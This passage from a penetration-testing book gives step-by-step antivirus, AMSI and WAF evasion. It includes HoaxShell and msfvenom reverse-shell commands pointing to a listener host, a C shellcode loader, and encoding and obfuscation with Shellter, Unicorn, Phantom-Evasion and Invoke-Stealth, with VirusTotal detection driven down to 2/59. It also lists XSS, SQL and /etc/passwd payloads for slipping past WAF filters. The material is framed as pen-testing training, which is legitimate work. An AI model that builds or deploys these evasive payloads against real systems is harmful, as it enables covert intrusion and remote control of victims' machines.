HoaxShell and AMSI bypass techniques are commonly employed by malicious individuals as part of their offensive security tactics. HoaxShell serves as a robust framework specifically designed to circumvent multiple security controls, notably including the Antimalware Scan Interface (AMSI) trigger. By utilizing HoaxShell, attackers aim to evade detection by antivirus software and other protective measures. On the other hand, AMSI, developed by Microsoft, acts as an interface for antivirus and other security solutions to scan and identify malicious code present within active processes. It is an essential component that enables the detection of potentially harmful activities.

Let us understand the step-by-step approach for bypassing security controls using the following technique:

1.  Start by downloading the AMSI trigger binary onto a Windows host. It is advisable to perform this step on a test machine to avoid any potential disturbances on the targeted system. See [Figure 9.18](#ch09.xhtml_fig9-18):

    Download Link: [https://github.com/RythmStick/AMSITrigger/releases/tag/v3](https://github.com/RythmStick/AMSITrigger/releases/tag/v3)

    ![](images/Figure_9.18.png)

    Figure 9.18: Downloading the AMSI trigger binary

2.  HoaxShell is a Windows reverse shell payload generator and handler that exploits the http(s) protocol to establish a reverse shell. You can download it from GitHub, as shown in [Figure 9.19](#ch09.xhtml_fig9-19):

    Download Link: [https://github.com/t3l3machus/hoaxshell](https://github.com/t3l3machus/hoaxshell)

    ![](images/Figure_9.19.png)

    Figure 9.19: Hoaxshell GitHub

3.  Download HoaxShell on the attacker machine (Kali Linux), using the wget https://github.com/t3l3machus/hoaxshell/archive/refs/heads/main.zip command, as demonstrated in [Figure 9.20](#ch09.xhtml_fig9-20):

    ![](images/Figure_9.20.png)

    Figure 9.20: Downloading HoaxShell

4.  Navigate to the HoaxShell folder and execute the command python hoaxshell.py -s 192.168.29.15 -r -H "Authorization" to generate the reverse shell raw payload. At the end, hoaxshell will automatically initiate the listener, eliminating the need to start a separate listener using tools like Netcat or Metasploit. See [Figure 9.21](#ch09.xhtml_fig9-21):

    ![](images/Figure_9.21.png)

    Figure 9.21: Generate the reverse shell raw payload

5.  Copy the raw payload script and navigate to the AMSI Trigger folder on the test Windows 10 machine. Create a text file, paste the code, and save it as a PowerShell script .ps1, as illustrated in [Figure 9.22](#ch09.xhtml_fig9-22):

    ![](images/Figure_9.22.png)

    Figure 9.22: Copy the raw payload script to test machine

6.  Run the command .\AmsiTrigger_x64.exe -i .\winpayload.ps1 in PowerShell to verify if the script is being detected by AMSI. In this case, it is detected. Please note that you may need to temporarily disable Windows Defender on your test machine to save the payload and perform the necessary checks. See [Figure 9.23](#ch09.xhtml_fig9-23):

    ![](images/Figure_9.23.png)

    Figure 9.23: Verifying if the script is being detected by AMSI

    To bypass security detection, apply three types of modifications. First, modify variables by identifying them with the $ sign, as everything with this sign represents a variable. Second, alter the case of standard keywords, such as converting them from lower to upper case or vice versa. Third, introduce a single quote (‘) into the middle of any command keyword to disrupt detection mechanisms.

7.  Multiple changes have been made to the payload raw code. For the purpose of comparison and enhanced comprehension, we have provided the raw code and the obfuscated code, which can be observed in [Figure 9.24](#ch09.xhtml_fig9-24):

    ![](images/Figure_9.24.png)

    Figure 9.24: Raw code and the obfuscated code

8.  Create a new PowerShell script in the AMSI trigger folder, and run the command .\AmsiTrigger_x64.exe -i .\winpayload.ps1 to test whether the detection has been successfully bypassed, as shown below in [Figure 9.25](#ch09.xhtml_fig9-25). Now, as we observe, it is evident that it is being detected as undetected:

    ![](images/Figure_9.25.png)

    Figure 9.25: Verifying if the script is being detected by AMSI

9.  Take the modified reverse shell script to the targeted Windows 10 host. Execute the script in PowerShell, and it should be executed successfully, as depicted in [Figure 9.26](#ch09.xhtml_fig9-26):

    ![](images/Figure_9.26.png)

    Figure 9.26: Running the modified reverse shell script on the target machine

10.  You have successfully obtained a reverse shell on the targeted Windows 10 host. Now, privilege escalation and lateral movement can be initiated. See [Figure 9.27](#ch09.xhtml_fig9-27):

    ![](images/Figure_9.27.png)

    Figure 9.27: Obtained a reverse shell

| Note: Just like HoaxShell, there are numerous open source and paid tools available on the dark web. However, as soon as these tools or scripts emerge, Antivirus (AV) companies promptly update their signature databases and behavior rules to counter them. Consequently, techniques that were once effective may become obsolete over time, leading researchers to develop new techniques in an ongoing cycle of innovation and adaptation. |

[Antivirus evasion techniques and tools](#contents.xhtml_sc2_255a)

Antivirus evasion encompasses the utilization of sophisticated methods and techniques by malicious actors to elude detection and bypass antivirus software. The primary aim is to make it arduous for conventional antivirus programs to identify or analyze the malicious code or files.

[Antivirus evasion techniques](#contents.xhtml_sc3_256a)

Antivirus software utilizes signature-based, heuristic-based, and behavior-based detection techniques to identify and prevent malware. Signature-based detection matches code patterns to known malware, heuristic-based detection analyzes the code for potentially harmful payloads, and behavior-based detection monitors executable behavior. These techniques synergistically defend against malware and ensure system security. To evade these detection methods, pen testers employ various antivirus evasion techniques, given in [Table 9.1](#ch09.xhtml_tab9-1):

| Technique | Description |
| Code Obfuscation | Modifying the code structure using encryption, randomization, and manipulation to make it harder to detect. |
| Polymorphism | Generating multiple code variants with the same functionality to evade signature-based detection. |
| Metamorphism | Altering code and behavior with each infection, making it difficult for antivirus programs to recognize the malware. |
| Packing and Encryption | Compressing or encrypting malware to obfuscate its true nature and prevent easy analysis. |
| Rootkits | Tampering with system functions or APIs to hide malicious activities and processes from antivirus software. |
| Zero-day Exploits | Exploiting unknown software vulnerabilities before antivirus vendors can develop appropriate signatures or updates. |

Table 9.1: Antivirus evasion techniques

[Antivirus evasion tools](#contents.xhtml_sc3_257a)

Antivirus evasion tools refer to software or scripts designed to assist in bypassing or circumventing antivirus detection. Several examples of antivirus evasion tools are given in [Table 9.2](#ch09.xhtml_tab9-2):

| Tool | Description |
| Harnessing Metasploit Templates and Custom Binaries for Antivirus Evasion | Popular penetration testing framework with modules for exploiting vulnerabilities and bypassing antivirus software. |
| Shellter | Dynamic shellcode injection tool for bypassing antivirus software. |
| Unicorn | PowerShell-based tool for generating obfuscated and undetectable payload executables. |
| Phantom-Evasion | Powerful evasion tool offering various obfuscation techniques for bypassing antivirus detection. |
| Invoke-Stealth | Tool designed to evade antivirus detection during penetration testing activities. |

Table 9.2: Antivirus evasion tools

[Harnessing Metasploit templates and custom binaries for antivirus evasion](#contents.xhtml_sc4_258a)

Metasploit is a powerful penetration testing framework which provides various templates and techniques for effective Antivirus (AV) evasion. These templates offer options like code obfuscation, polymorphism, and packing to create custom payloads that are less likely to be flagged by AV software. By leveraging the versatile capabilities of Metasploit, practitioners can significantly improve their chances of successfully evading AV defenses. This allows pen testers for more comprehensive security assessments and testing.

To gain a comprehensive understanding of this process, we will employ various techniques in the following manner:

Baseline payload

1.  To establish a baseline, we will generate the standard msfvenon reverse shell payload for a 32-bit Windows system using the command msfvenom -p windows/shell_reverse_tcp LHOST=192.168.29.15 LPORT=4444 -f exe > basepayload.exe as depicted in [Figure 9.28](#ch09.xhtml_fig9-28):

    ![](images/Figure_9.28.png)

    Figure 9.28: Generate the standard msfvenon reverse shell payload

2.  Subsequently, we will upload the generated payload to VirusTotal in order to assess its detection rate. As shown in the [Figure 9.29](#ch09.xhtml_fig9-29), the detection ratio is 56/70:

    ![](images/Figure_9.29.png)

    Figure 9.29: Upload the payload to VirusTotal

3.  During payload generation, our custom-built shellcode is injected into the template binaries. To observe this, execute the commands cd /usr/share/metasploit-framework/data/templates/src/pe/exe and cat template.c, as illustrated in [Figure 9.30](#ch09.xhtml_fig9-30), which demonstrates the earlier payload generation with default template binaries:

    ![](images/Figure_9.30.png)

    Figure 9.30: Template binaries

Technique 1

1.  To further decrease VirusTotal detections, we can make a few changes to the code, particularly in memory allocation sizes. Implement the modifications in memory allocation and char size, as showcased in [Figure 9.31](#ch09.xhtml_fig9-31):

    ![](images/Figure_9.31.png)

    Figure 9.31: Changes to the code

2.  For a better grasp of the working process, let us simply recompile the standard template and regenerate the payload using the newly compiled template. Refer to [Figure 9.32](#ch09.xhtml_fig9-32) for the set of commands to execute:

    The commands are as follows:

    a. i686-w64-mingw32-gcc template.c -lws2_32 -o avbypassummed.exe

    b. sudo msfvenom -p windows/shell_reverse_tcp LHOST=192.168.29.15 LPORT=4444 -x /usr/share/metasploit-framework/data/templates/src/pe/exe/avbypassummed.exe -f exe > /home/ummedmeel/Desktop/ummedpayload.exe

    ![](images/Figure_9.32.png)

    Figure 9.32: Recompile the standard template

3.  Following the code adjustments, upload the newly generated payload to VirusTotal to evaluate its detection rate. The [Figure 9.33](#ch09.xhtml_fig9-33) indicates a reduced detection ratio of 48/71:

    ![](images/Figure_9.33.png)

    Figure 9.33: Uploading the newly generated payload to VirusTotal

Technique 2

1.  Now, let us delve into a more customized approach to build a binary. Utilize msfvenom to export the reverse_tcp payload by executing the command msfvenom -p windows/shell_reverse_tcp LHOST=192.168.29.15 LPORT=4444 -f c. This will generate the payload as illustrated in [Figure 9.34](#ch09.xhtml_fig9-34):

    ![](images/Figure_9.34.png)

    Figure 9.34: Generating raw payload using msfvenom

2.  In order to merge the binary and payload and generate a customized payload, we will employ Visual Studio 2022. Install Visual Studio (community edition) on your Windows system, navigate to Create a new project, select Empty Project, right-click on Source Files to add a New item, and name it main.cpp., as illustrated in [Figure 9.35](#ch09.xhtml_fig9-35), 9.36 and 9.37:

    Click on ‘Create a new project,’ depicted in [Figure 9.35](#ch09.xhtml_fig9-35) below:

    ![](images/Figure_9.35.png)

    Figure 9.35: Create a new project

    Click on ‘Empty Project,’ depicted in [Figure 9.36](#ch09.xhtml_fig9-36) below:

    ![](images/Figure_9.36.png)

    Figure 9.36: Empty project

    Click on ‘New Item,’ depicted in [Figure 9.37](#ch09.xhtml_fig9-37) below :

    ![](images/Figure_9.37.png)

    Figure 9.37: Add a new item

3.  Inside the main.cpp file, paste the provided code mentioned below, as demonstrated in [Figure 9.38](#ch09.xhtml_fig9-38). This step is necessary because standard template binaries are easily detected by AV. By utilizing customized templates, we can overcome this limitation:

    #include <stdio.h>

    #include <windows.h>

    unsigned const char payload[] = "";

    size_t size = 0;

    int main(int argc, char** argv) {

    char* code;

    printf("This is just a random string!\n");

    code = (char*)VirtualAlloc(NULL, size, MEM_COMMIT,PAGE_EXECUTE_READWRITE);

    memcpy(code, payload, size);

    ((void(*)())code)();

    return(0);

    }

    ![](images/Figure_9.38.png)

    Figure 9.38: Customized templates

4.  Retrieve the Payload size number (excluding the Final size of c file) from the previous payload generation process, such as 1392 bytes. Replace the placeholder in payload[] with the shellcode generated in buf[], as shown in [Figure 9.39](#ch09.xhtml_fig9-39):

    ![](images/Figure_9.39.png)

    Figure 9.39: Updating the Payload size

5.  Introduce random text to generate different signatures each time, as depicted in the [Figure 9.40](#ch09.xhtml_fig9-40):

    ![](images/Figure_9.40.png)

    Figure 9.40: Introduce random text

6.  Proceed to Visual Studio, select Release from the build dropdown menu, and initiate the building process for the final payload, as depicted in the [Figure 9.41](#ch09.xhtml_fig9-41):

    ![](images/Figure_9.41.png)

    Figure 9.41: Release payload

7.  Upon successful generation, the payload will be stored in the specified location on your system, as illustrated in [Figure 9.42](#ch09.xhtml_fig9-42):

    ![](images/Figure_9.42.png)

    Figure 9.42: Payload generated

8.  Upload the generated payload to VirusTotal to examine its detection rate, which should show a reduced ratio of 41/70, as indicated in the [Figure 9.43](#ch09.xhtml_fig9-43):

    ![](images/Figure_9.43.png)

    Figure 9.43: Uploading the generated payload to VirusTotal

Technique 3

1.  For further reduction in VirusTotal detection, let us utilize msfvenom to export the reverse_tcp payload as encoded shellcode. Execute the command msfvenom -p windows/meterpreter/reverse_tcp LHOST=191.168.29.15 LPORT=4444 -e x86/shikata_ga_nai -i 8 -f c while modifying the IP and port of your listener. You may also adjust the number of iterations -i 8; using upto 25 iterations should be safe in most scenarios, as demonstrated in [Figure 9.44](#ch09.xhtml_fig9-44):

    ![](images/Figure_9.44.png)

    Figure 9.44: Generate encoded shellcode

2.  Repeat the aforementioned process on Visual Studio as explained in the previous phase to create the payload, as shown in [Figure 9.45](#ch09.xhtml_fig9-45):

    ![](images/Figure_9.45.png)

    Figure 9.45: Generate payload

3.  Finally, upload the newly generated payload to VirusTotal to assess its detection rate, which should exhibit a reduced ratio of 38/71, as depicted in the [Figure 9.46](#ch09.xhtml_fig9-46):

![](images/Figure_9.46.png)

Figure 9.46: Uploading the newly generated payload to VirusTotal

| Tip: Metasploit’s vast collection of exploits, payloads, and evasion techniques enables successful system compromise by evading AV detection. Utilizing advanced evasion techniques reduces detection rates, enhancing the effectiveness of security assessments. |

[Shellter](#contents.xhtml_sc4_259a)

Shellter is an advanced and dynamic shellcode injection tool which is widely utilized in red teaming engagements and security assessments carried out by penetration testers and ethical hackers. Its main objective is to evade AV software and IDS. Shellter achieves this by employing dynamic encryption or encoding techniques for payloads.

Using the technique known as process hollowing, Shellter injects malicious shellcode into the memory space of legitimate processes. Moreover, researchers can leverage this tool to evaluate the effectiveness of security controls and identify potential vulnerabilities in an organization’s defense mechanisms.

Let us delve into the various applications of Shellter through the following steps. You have the flexibility to choose any executable for payload injection. For this demonstration, we will showcase the usage of calc.exe. To begin with, we will focus on a single level of Shellter, as gradually increasing customization can effectively mitigate AV detection. Follow the steps given below:

1.  Install and launch Shellter on Kali Linux by running the command shellter in the terminal. Choose the automatic mode, as shown in [Figure 9.47](#ch09.xhtml_fig9-47):

    ![](images/Figure_9.47.png)

    Figure 9.47: Installing and launching Shellter on Kali Linux

2.  Download calculator executable from the website [https://www.filehorse.com/download-windows7-calculator/download/](https://www.filehorse.com/download-windows7-calculator/download/).

3.  Specify the target executable file that will serve as the carrier for the payload. This file should be suitable for your target environment. In this case, we will be using the calc.exe executable as the carrier, as shown in [Figure 9.48](#ch09.xhtml_fig9-48):

    ![](images/Figure_9.48.png)

    Figure 9.48: Specifying the target executable file

4.  Select the stealth mode option, as shown in [Figure 9.49](#ch09.xhtml_fig9-49):

    ![](images/Figure_9.49.png)

    Figure 9.49: Selecting the stealth mode option

5.  In another terminal, execute the command msfvenom -p windows/meterpreter/reverse_tcp LHOST=191.168.29.15 LPORT=4444 -e x86/shikata_ga_nai -i 8 -f raw > scode.raw to create an encrypted customized payload in raw format, as demonstrated in [Figure 9.50](#ch09.xhtml_fig9-50):

    ![](images/Figure_9.50.png)

    Figure 9.50: Generating raw payload

6.  Return to the previous terminal and navigate to the location of the raw payload. Shellter will automatically analyze the carrier executable and identify potential injection points. Choose the option to use a custom payload and provide the location of the payload file. The payload file can be a custom shellcode or a pre-compiled binary. In this case, we are using a customized payload, so select option C, as shown in [Figure 9.51](#ch09.xhtml_fig9-51):

    ![](images/Figure_9.51.png)

    Figure 9.51: Selecting customized payload

7.  Shellter will automatically generate the modified carrier executable with the injected payload, as shown in [Figure 9.52](#ch09.xhtml_fig9-52):

    ![](images/Figure_9.52.png)

    Figure 9.52: Payload generated

8.  Upload the modified carrier to VirusTotal to check the detection ratio. In this case, the detection ratio is 12/71, as shown in [Figure 9.53](#ch09.xhtml_fig9-53):

    ![](images/Figure_9.53.png)

    Figure 9.53: Uploading the modified carrier to VirusTotal

| Note: Shellter’s unique and powerful feature is dynamic binary instrumentation and injection, allowing seamless payload injection into Windows executables, evading antivirus and intrusion detection systems effectively. |

[Unicorn](#contents.xhtml_sc4_260a)

The utilization of Magic Unicorn is a straightforward tool which involves executing a PowerShell downgrade attack and directly injecting shellcode into the system’s memory. The usage process is uncomplicated: by launching Magic Unicorn (ensuring the presence of Metasploit in the correct path if opting for Metasploit methods), the tool automatically generates a PowerShell command. All that is required is to copy and paste this generated code into a command line window or a payload delivery system for seamless execution.

To comprehend the functionality of this tool and generate a PowerShell payload, let us explore the following steps:

1.  Clone Unicorn by running the command git clone github.com/trustedsec/unicorn, as shown in [Figure 9.54](#ch09.xhtml_fig9-54):

    ![](images/Figure_9.54.png)

    Figure 9.54: Clone unicorn

2.  Next, navigate to the new Unicorn directory using the command cd unicorn. To view the available Unicorn options and comprehensive descriptions of each attack, use the command ./unicorn.py --help, as shown in [Figure 9.55](#ch09.xhtml_fig9-55):

    ![](images/Figure_9.55.png)

    Figure 9.55: Unicorn options and comprehensive descriptions

3.  To create a payload with Unicorn, use the following command: ./unicorn.py windows/meterpreter/reverse_tcp <Listener IP> <Listener Port>, as shown in [Figure 9.56](#ch09.xhtml_fig9-56). Unicorn will utilize the Metasploit reverse_tcp module to connect to the attacker’s IP address using the specified port as follows:

    ![](images/Figure_9.56.png)

    Figure 9.56: Creating a payload with Unicorn

4.  The generated files, powershell_attack.txt and unicorn.rc. The text file includes the code for the attack, while the RC file contains the commands to initiate the listener with a single click. See [Figure 9.57](#ch09.xhtml_fig9-57):

    ![](images/Figure_9.57.png)

    Figure 9.57: Generated payload and RC file

5.  To start the listener, execute the command msfconsole -r unicorn.rc, as demonstrated in the figure. The RC file, known as a resource file, contains all the required commands in a hierarchical order. When executed, Metasploit will process and execute each command from the RC file sequentially. Additionally, to establish a reverse shell, transfer the PowerShell code from the TXT file to the victim’s machine. Copy the entire command from the TXT file, paste it into PowerShell, and press enter. This will establish the reverse connection. See [Figure 9.58](#ch09.xhtml_fig9-58):

    ![](images/Figure_9.58.png)

    Figure 9.58: Start the listener

6.  Now, let us upload this TXT payload to VirusTotal to check the detection ratio. Here, we can observe a low detection rate of only 14  out of 58, as depicted in [Figure 9.59](#ch09.xhtml_fig9-59):

![](images/Figure_9.59.png)

Figure 9.59: Upload this TXT payload to VirusTotal

| Note: Unicorn excels in generating undetectable payload executables through powerful encoding and obfuscation techniques, enabling seamless exploitation of target systems while evading antivirus and security solutions. |

[Phantom-Evasion](#contents.xhtml_sc4_261a)

Phantom-Evasion is a python-based tool designed for antivirus evasion purposes. It has the capability to generate executable files that are highly difficult to detect, even when using the widely used x86 msfvenom payload.

Let us explore the step-by-step usage of Phantom-Evasion:

1.  Begin by downloading the tool using the command git clone https://github.com/oddcod3/Phantom-Evasion.git, as depicted in [Figure 9.60](#ch09.xhtml_fig9-60):

    ![](images/Figure_9.60.png)

    Figure 9.60: Downloading Phantom-Evasion

2.  Navigate to the Phantom-Evasion folder by executing the command cd /phantom-evasion. Grant executable permissions and set up the required dependencies by running the commands chmod +x ./phantom-evasion.py and ./phantom-evasion.py --setup, as shown in [Figure 9.61](#ch09.xhtml_fig9-61):

    ![](images/Figure_9.61.png)

    Figure 9.61: Grant executable permissions and set up the decencies

3.  Retrieve assistance and access the list of available features by running the command ./phantom-evasion.py --help, as demonstrated in [Figure 9.62](#ch09.xhtml_fig9-62):

    ![](images/Figure_9.62.png)

    Figure 9.62: Retrieve assistance and access the list of available features

4.  Generate the payload using the following command: python3 phantom-evasion.py -m WSI -msfp windows/meterpreter/reverse_tcp -H 192.168.29.15 -P 4444 -i Thread -e 4 -mem Virtual_RWX -j 1 -J 15 -jr 0 -E 5 -f exe -o PhEv.exe, as shown in [Figure 9.63](#ch09.xhtml_fig9-63):

    ![](images/Figure_9.63.png)

    Figure 9.63: Generate payload

5.  The payload has been successfully generated, as indicated in [Figure 9.64](#ch09.xhtml_fig9-64):

    ![](images/Figure_9.64.png)

    Figure 9.64: Payload has been generated

6.  To evaluate the detection ratio, let us upload the payload to VirusTotal. Here, the detection ratio is 31/71, as illustrated in [Figure 9.65](#ch09.xhtml_fig9-65):

    ![](images/Figure_9.65.png)

    Figure 9.65: Evaluating the detection ratio

INFO: Phantom Evasion’s exceptional polymorphic engine and payload generation capabilities empower penetration testers to create undetectable payloads, bypassing antivirus software and security controls for successful system infiltration.

[Invoke-Stealth](#contents.xhtml_sc4_262a)

This tool helps you to automate the obfuscation process of any script written in PowerShell with different techniques. You can use any of them separately, together or all of them sequentially with ease, from Windows or Linux.

Let us understand the process of obfuscating PowerShell payloads using Invoke-Stealth through a step-by-step approach:

1.  Begin by downloading Invoke-Stealth. Execute the command git clone https://github.com/JoelGMSec/Invoke-Stealth.git to download the tool, as illustrated in [Figure 9.66](#ch09.xhtml_fig9-66):

    ![](images/Figure_9.66.png)

    Figure 9.66: Downloading Invoke-Stealth

2.  Navigate to the Invoke-Stealth folder using the command cd Invoke-Stealth. Run the command pwsh Invoke-Stealth.ps1 --help to explore the available obfuscation techniques and other utilities. Refer to [Figure 9.67](#ch09.xhtml_fig9-67) for a visual representation:

    ![](images/Figure_9.67.png)

    Figure 9.67: Navigate to the Invoke-Stealth folder

3.  Let us generate a standard PowerShell payload using msfvenom. Use the following command: msfvenom -p windows/powershell_reverse_tcp LHOST=192.168.29.15 LPORT=4444 -e x86/shikata_ga_nai -f psh -o payloadummed.ps1. This command, as depicted in [Figure 9.68](#ch09.xhtml_fig9-68), generates the payload without any obfuscation:

    ![](images/Figure_9.68.png)

    Figure 9.68: Generating a standard PowerShell payload

4.  Upload the unobfuscated PowerShell payload to VirusTotal to assess its detection rate. In [Figure 9.69](#ch09.xhtml_fig9-69), the detection rate is reported as 25/59:

    ![](images/Figure_9.69.png)

    Figure 9.69: Uploading the unobfuscated PowerShell payload to VirusTotal

5.  Now, obfuscate the PowerShell payload using Invoke-Stealth. Execute the following command pwsh Invoke-Stealth.ps1 /home/ummedmeel/Desktop/payloadummedm.ps1 -technique All. This command, shown in [Figure 9.70](#ch09.xhtml_fig9-70), applies all available obfuscation techniques simultaneously to reduce the chances of detection:

    ![](images/Figure_9.70.png)

    Figure 9.70: Obfuscate the PowerShell payload using Invoke-Stealth

    The All flag signifies this approach. In order to prevent the payload from having the same hash value in its signature, we have modified the name of the previously generated payload.

6.  Upload the obfuscated payload to VirusTotal once again to evaluate the detection ratio. Remarkably, the PowerShell payload is now FUD, as indicated by the 2/59 detection ratio in [Figure 9.71](#ch09.xhtml_fig9-71):

![](images/Figure_9.71.png)

Figure 9.71: Uploading the obfuscated payload to VirusTotal

INFO: Invoke-Stealth generates stealthy PowerShell scripts using obfuscation and encryption to evade antivirus detection and execute covert operations.

[Cutting-edge WAF evasion tactics](#contents.xhtml_sc2_263a)

A WAF serves as a security solution explicitly designed to safeguard web applications against a variety of attacks. By implementing a set of rules, a WAF actively identifies and obstructs malicious requests or suspicious activities.

WAF evasion techniques pertain to the methods employed by penetration testers to effectively evade or circumvent the protective measures established by a WAF. These testers strive to bypass a WAF to identify potential vulnerabilities or weaknesses present in the web applications shielded by the firewall, which could potentially be exploited by malicious individuals. By comprehending the mechanisms of WAF evasion, penetration testers can evaluate the efficacy of the WAF and assist organizations in fortifying their security defenses for web-based applications.

Bypassing a WAF involves various techniques to evade or circumvent its protections. Here are some common techniques that attackers and penetration testers may employ to bypass a WAF as shown in [Table 9.3](#ch09.xhtml_tab9-3):

| Technique | Description |
| Payload Obfuscation | Modifying or encoding the attack payload to evade signature-based detection. Techniques include URL encoding, character encoding, etc. |
| Parameter Fragmentation | Dividing attack payloads across multiple request parameters or sections to bypass specific WAF rules based on complete attack patterns. |
| Protocol-Level Evasion | Exploiting inconsistencies or ambiguities in the HTTP protocol specifications to manipulate request headers. |
| Manipulating HTTP Methods | Leveraging less commonly used HTTP methods (for example, PROPFIND or OPTIONS) to evade specific WAF protections. |
| IP and User-Agent Spoofing | Modifying the source IP address or User-Agent header to masquerade as a trusted entity or emulate a legitimate user. |
| Request Smuggling | Exploiting variations in how servers interpret HTTP request delimiters or handling multiple requests within a single HTTP connection. |
| WAF Misconfigurations | Identifying and exploiting misconfigurations in WAF rules, whitelists, or blacklists to bypass specific protections. |
| HTTP Parameter Pollution | Manipulating or duplicating parameters in the request to confuse the WAF and potentially bypass its filtering mechanisms. |
| Slow HTTP Attacks | Exploiting server resource handling by sending requests with slow data transmission, causing timeouts or resource exhaustion. |
| Encrypted Traffic | Utilizing encryption methods (for example, SSL/TLS) to conceal the malicious payload from WAF inspection. |

Table 9.3: WAF bypass techniques

Let us explore some of these techniques and their corresponding payload examples:

*   Case manipulation: Some poorly developed WAFs selectively filter payloads based on case sensitivity. By combining upper and lower case characters, we can bypass these filters.

    Example:

    *   Standard payload: <script>alert()</script>

    *   Bypassed payload: <ScRiPt>alert()</ScRiPt>

    *   Similarly, the SQL query SELECT * FROM users WHERE username = ‘ummed’ can be bypassed as SeLecT * FRoM users WhErE username = ‘ummed’.

*   HTML encoding: Web applications often encode special characters into their HTML representations. By using HTML encoding, we can bypass certain WAF filters.

    Example:

    *   Standard payload: <script>alert(1)</script>

    *   Encoded payload: &lt;script&gt;alert(1)&lt;/script&gt

    *   Similarly, the SQL query SELECT * FROM users WHERE username = ‘admin’ can be encoded as SELECT * FROM users WHERE username = ‘adm&#105;n’.

*   URL Percent-encoding: URL encoding payloads using the % sign can help bypass WAFs.

    Example:

    *   Blocked payload: <img src=x onerror=alert(1)>

    *   Bypassed payload: %3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E

    *   Similarly, the SQL query SELECT * FROM users WHERE id = 1 OR 1=1 can be bypassed as SELECT%20*%20FROM%20users%20WHERE%20id%20%3D%201%20OR%201%3D1.

*   Unicode transformation: Exploiting ASCII characters encoded in Unicode can bypass certain filters. By encoding payloads using Unicode representations, we can evade detection.

    Example:

    *   Standard payload: <script>alert(1)</script>

    *   Obfuscated payload: <script>alert\u00281\u0029</script>

    *   Similarly, the SQL query SELECT * FROM users WHERE username = ‘admin’ can be bypassed as SELECT * FROM users WHERE username = ‘adm\u0069n’.

*   Mixed encodings: By using a combination of different encodings, we can bypass filters that target specific encoding types. Combining URL encoding with HTML encoding can yield effective bypasses.

    Example:

    *   Standard payload: <script>alert(1)</script>

    *   Obfuscated payload: %3cscript%3ealert%281%29%3c%2fscript%3e

*   Comments and whitespace Tricks

    Including comments and whitespace in payloads can help obfuscate them and bypass filters.

    Example:

    *   Standard payload: <script>alert(1)</script>

    *   Obfuscated payload: <!-- <script> --> alert(1) <!-- </script> -->

*   Payload fragmentation and concatenation: Splitting payloads into fragments or concatenating them in unexpected ways can bypass certain WAF filters.

    Example:

    *   Standard payload: <script>alert(1)</script>

    *   Fragmented payload: <<script>>a<</script>>lert(1)<</script>>

*   Dynamic payload generation: By dynamically generating payloads using programming language features like concatenation, we can bypass WAF filters.

    Example:

    *   Standard payload: <script>alert(1)</script>

    *   Obfuscated payload: <script>e%76al(‘a’%2B’lert(1)’)</script>

*   Uninitialized variable exploitation

    Using uninitialized variables in scripting languages like Bash and Perl can help evade regular expression-based filters and pattern matching. Uninitialized variables behave as null or empty strings, allowing us to bypass certain detection mechanisms.

    Example:

    Level 1 Obfuscation: Normal

    *   Standard payload: /bin/cat /etc/passwd

    *   Obfuscated oayload: /bin/cat$randomVar /etc/passwd$randomVar

    Level 2 Obfuscation: Position based

    *   Standard payload: /bin/cat /etc/passwd

    *   Obfuscated payload: $randomVar/bin$randomVar/cat$randomVar $randomVar/etc$randomVar/passwd$randomVar

    Level 3 Obfuscation: Random characters

    *   Standard payload: /bin/cat /etc/passwd

    *   Obfuscated payload: $aaaaaa/bin$bbbbbb/cat$ccccccc $dddddd/etc$eeeeeee/passwd$fffffff

*   Tabs and line breaks: Tabs can be effective in evading firewalls, particularly regex-based ones. When a firewall expects whitespace characters instead of tabs, utilizing tabs can disrupt its regex patterns.

    Example:

    *   Standard payload: <script>alert(1);</script>

    *   Bypassed payload: <script> alert(1);</script>

    *   Standard URL: [http://example.com/page?param1=value1&param2=value2](http://example.com/page?param1=value1&param2=value2)

    *   URL Encoded (Tabs and Line Feeds): [http://example.com/page?param1=value1%09%0A&param2=value2](http://example.com/page?param1=value1%09%0A&param2=value2)

| Note: WAF evasion involves bypassing a Web Application Firewall’s protections to identify vulnerabilities in shielded web applications using techniques like payload analysis, protocol-based attacks, and custom exploits. |

[Evolving social engineering tactics](#contents.xhtml_sc2_264a)

Social engineering is a sneaky tactic used by attackers to manipulate individuals into revealing sensitive information or bypassing security measures. It takes advantage of human psychology and trust to gain unauthorized access to systems and data. Unlike traditional penetration testing, social engineers focus on exploiting human vulnerabilities rather than just technical weaknesses. This poses a significant threat to organizations’ cybersecurity because people are often the weakest link in the security chain. While technical vulnerabilities can be mitigated with security controls, there is no foolproof way to completely protect against human errors and mistakes.

Here are several techniques used in social engineering attacks that can compromise an organization’s cybersecurity:

| Social Engineering Technique | Description |
| Phishing | Attackers employ deceptive emails, impersonating legitimate sources, to trick recipients into revealing confidential information or clicking on malicious links. |
| Pretexting | Attackers fabricate false scenarios or reasons to manipulate individuals into divulging sensitive information or performing unusual actions. |
| Baiting | Attackers strategically place physical devices or infected media, such as USB drives, in public areas, enticing unsuspecting individuals to execute malicious code unknowingly. |
| Tailgating | Attackers exploit the trust of employees by closely following them or posing as authorized personnel, gaining unauthorized access to restricted areas or systems. |
| Impersonation | Attackers masquerade as trustworthy entities, such as colleagues, IT support, or vendors, to deceive individuals into sharing sensitive information or granting unauthorized access. |
| Reverse Social Engineering | Attackers build trust with individuals before manipulating them into performing harmful actions or revealing confidential information. |

Table 9.4: Social engineering tactics

To enhance protection against social engineering attacks, organizations should take the following measures:

*   Continuous education: Regularly educate employees about various social engineering techniques and consistently raise awareness of potential threats.

*   Implement Zero Trust policy: Embrace a Zero Trust approach and enforce strict access controls, incorporating robust authentication mechanisms and the principle of least privilege.

*   Vigilant patch management: Implement an effective patch management cycle to promptly address and patch known vulnerabilities, thereby thwarting attackers from exploiting them.

*   Email filtering and spam detection: Deploy reliable email filtering and spam detection mechanisms to identify and block phishing attempts, reducing the chances of employees falling victim to deceptive emails.

*   Regular security assessments: Conduct periodic security assessments, including simulated social engineering attacks, to identify emerging attack trends and vulnerabilities. This allows organizations to train employees on best practices and stay ahead of evolving threats.

*   Multi-layered security approach: Employ a comprehensive security strategy that combines advanced technology solutions, ongoing employee education, and proactive measures. This multi-layered approach is crucial for effectively defending against social engineering attacks.

| Note: Even with comprehensive security controls in place, social engineering attacks remain a potent method for breaching organizations. Human fallibility makes it difficult to prevent entirely, as unsuspecting victims can unwittingly open pathways for attackers, highlighting the importance of addressing human vulnerabilities alongside technical defenses. |

[Phishing simulation](#contents.xhtml_sc3_265a)

